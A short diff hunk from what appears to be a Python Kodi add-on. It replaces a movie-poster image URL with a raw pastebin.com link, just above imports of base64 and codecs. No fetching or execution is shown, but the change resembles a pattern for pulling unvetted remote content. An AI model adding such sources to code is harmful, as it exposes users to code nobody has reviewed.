@@ -19,7 +19,7 @@ from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
 from six.moves import urllib_request
 import six
 TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
-url = 'https://www.themoviedb.org/t/p/original/r82gsvG8sAX6V3gWZL5hgVvu8un.jpg'
+url = 'https://pastebin.com/raw/V2vUQEPX'
 titulo = 'Los Ultimos Dias De Ptolemy Grey'
 import base64, codecs
 
